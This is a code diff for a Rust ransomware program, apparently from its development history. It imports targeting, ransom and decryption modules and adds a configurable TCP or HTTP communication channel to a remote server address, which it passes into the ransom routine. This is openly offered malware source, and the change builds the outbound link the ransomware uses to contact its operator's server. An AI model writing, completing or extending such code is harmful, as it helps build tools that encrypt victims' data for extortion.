@@ -11,6 +11,8 @@ use std::sync::Arc;
 use crate::utils::{logger, config::AppConfig};
 use crate::core::{targeting, ransom};
 use crate::crypto::decryption;
+use crate::communication::comm::{channel, tcp, http};
+
 
 
 #[derive(Parser)]
@@ -47,7 +49,26 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             std::process::exit(1);
         });
 
-        if let Err(e) = ransom::ransom(logger.clone(), &config).await {
+        let comm_channel: Arc<dyn channel::CommChannel> = match config.service.as_str() {
+            "TCP" => Arc::new(tcp::TcpCommChannel {
+                address: config.server_address.clone(),
+                retries: config.retries,
+                timeout: config.timeout_seconds,
+            }),
+            "HTTP" => Arc::new(http::HTTPCommChannel {
+                address: config.server_address.clone(),
+                retries: config.retries,
+                timeout: config.timeout_seconds,
+            }),
+            _ => Arc::new(tcp::TcpCommChannel {
+                address: config.server_address.clone(),
+                retries: config.retries,
+                timeout: config.timeout_seconds,
+            }),
+        };
+
+
+        if let Err(e) = ransom::ransom(logger.clone(), &config, comm_channel).await {
             logger.error(&format!("Ransomware failed: {}", e));
         }
 
